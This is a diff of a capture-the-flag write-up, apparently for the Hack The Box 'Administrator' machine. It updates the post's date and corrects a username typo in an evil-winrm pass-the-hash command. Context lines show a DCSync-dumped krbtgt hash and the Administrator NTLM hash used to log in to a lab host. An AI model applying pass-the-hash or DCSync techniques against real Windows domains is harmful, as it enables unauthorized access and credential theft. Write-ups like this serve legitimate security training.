@@ -1,6 +1,6 @@
 ---
 title: "Administrator"
-date: 10-03-2025
+date: 15-03-2025
 categories: [Windows, Medium]
 tags: [Medium, AD, DCSync, Kerberoast, Lateral Movement]
 image: https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png
@@ -173,7 +173,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
 From here we can try to crack the hash but its not really necessary we can use pass the hash to login as administrator from `evil-winrm`.
 
 ```
-evil-winrm -i 10.10.11.42 -u Admnistrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
 ```
 
 Overall this was a very fun box and I liked the concepts of lateral movement to get the password database from the FTP server. 
